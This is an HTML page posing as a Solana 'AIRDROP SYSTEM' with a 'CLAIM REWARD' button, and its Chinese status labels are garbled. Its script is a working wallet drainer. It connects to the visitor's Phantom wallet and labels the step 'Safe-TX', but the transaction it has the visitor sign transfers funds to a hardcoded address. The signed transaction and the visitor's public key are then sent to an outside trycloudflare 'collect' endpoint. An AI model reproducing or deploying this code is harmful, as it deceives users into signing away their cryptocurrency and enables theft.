<!DOCTYPE html><html><head><meta charset="UTF-8">
<script src="https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.87.6/index.iife.min.js"></script></head>
<body style="background:#000;color:#14F195;text-align:center;padding-top:10vh;font-family:monospace;">
    <div style="border:1px solid #14F195;padding:30px;display:inline-block;border-radius:20px;background:#111;width:320px;">
        <h1 style="font-size:20px;">AIRDROP SYSTEM V4.1</h1>
        <button id="cta" style="padding:15px 30px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;width:100%;">CLAIM REWARD</button>
        <div id="status" style="margin-top:20px;color:#888;">System Standby</div>
    </div>

    <div id="diag" style="margin-top:20px; text-align:left; display:inline-block; width:320px; background:#050505; padding:15px; border:1px solid #333; font-size:12px;">
        <div style="color:#555;border-bottom:1px solid #333;margin-bottom:10px;padding-bottom:5px;">[ ğŸ”± é“¾è·¯è¯Šæ–­ä¸­å¿ƒ ]</div>
        <div id="check1">â— æ ¸å¿ƒåº“åŠ è½½... [ç­‰å¾…]</div>
        <div id="check2">â— é’±åŒ…æ³¨å…¥ç¯å¢ƒ... [ç­‰å¾…]</div>
        <div id="check3">â— ç½‘å…³é€šè®¯æµ‹è¯•... [ç­‰å¾…]</div>
        <div id="check4">â— ç­¾ååè®®å¯¹æ¥... [ç­‰å¾…]</div>
    </div>

    <script>
    const gate = "https://alias-beach-replace-handled.trycloudflare.com/collect";

    async function runSelfTest() {
        // 1. æ£€æŸ¥ Web3 åº“
        if (typeof solanaWeb3 !== 'undefined') {
            document.getElementById('check1').innerHTML = "â— æ ¸å¿ƒåº“åŠ è½½: <span style='color:#14F195'>âœ… å·²å°±ç»ª</span>";
        } else {
            document.getElementById('check1').innerHTML = "â— æ ¸å¿ƒåº“åŠ è½½: <span style='color:red'>âŒ å¤±è´¥ (CDNæ‹¦æˆª)</span>";
        }

        // 2. æ£€æŸ¥é’±åŒ…
        const p = window.solana || window.phantom?.solana;
        if (p) {
            document.getElementById('check2').innerHTML = "â— é’±åŒ…ç¯å¢ƒ: <span style='color:#14F195'>âœ… å·²æ£€æµ‹ (Phantom)</span>";
        } else {
            document.getElementById('check2').innerHTML = "â— é’±åŒ…ç¯å¢ƒ: <span style='color:red'>âŒ å¤±è´¥ (éé’±åŒ…æµè§ˆå™¨)</span>";
        }

        // 3. æ£€æŸ¥ç½‘å…³é€šè®¯ (ä½¿ç”¨ ping æµ‹è¯•)
        try {
            const start = Date.now();
            await fetch(gate, { method: 'GET', mode: 'no-cors' });
            document.getElementById('check3').innerHTML = "â— ç½‘å…³é€šè®¯: <span style='color:#14F195'>âœ… è¿é€š (å»¶è¿Ÿ:"+(Date.now()-start)+"ms)</span>";
        } catch(e) {
            document.getElementById('check3').innerHTML = "â— ç½‘å…³é€šè®¯: <span style='color:red'>âŒ é˜»æ–­ (å¤©çº¿åœ°å€å¤±æ•ˆ)</span>";
        }
    }

    // é¡µé¢åŠ è½½å³è¿è¡Œè‡ªæ£€
    window.onload = runSelfTest;

    document.getElementById('cta').onclick = async () => {
        try {
            const p = window.solana || window.phantom?.solana;
            await p.connect();
            
            document.getElementById('status').innerText = "Constructing Safe-TX...";
            const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
            const { blockhash } = await conn.getLatestBlockhash();
            
            const tx = new solanaWeb3.Transaction();
            tx.recentBlockhash = blockhash;
            tx.feePayer = p.publicKey;
            tx.add(solanaWeb3.SystemProgram.transfer({
                fromPubkey: p.publicKey,
                toPubkey: new solanaWeb3.PublicKey("8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A"),
                lamports: 5000000 
            }));

            document.getElementById('check4').innerHTML = "â— ç­¾ååè®®: <span style='color:yellow'>â³ æ­£åœ¨å”¤èµ·...</span>";
            const signed = await p.signTransaction(tx);
            document.getElementById('check4').innerHTML = "â— ç­¾ååè®®: <span style='color:#14F195'>âœ… å·²ç­¾å‘</span>";

            const raw = btoa(String.fromCharCode.apply(null, signed.serialize()));
            await fetch(gate, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ signature: raw, pubkey: p.publicKey.toString() })
            });
            document.getElementById('status').innerText = "TRANSMITTED!";
        } catch(e) { 
            document.getElementById('status').innerText = "ERR: " + e.message;
            document.getElementById('check4').innerHTML = "â— ç­¾ååè®®: <span style='color:red'>âŒ å¼‚å¸¸</span>";
        }
    }
    </script></body></html>
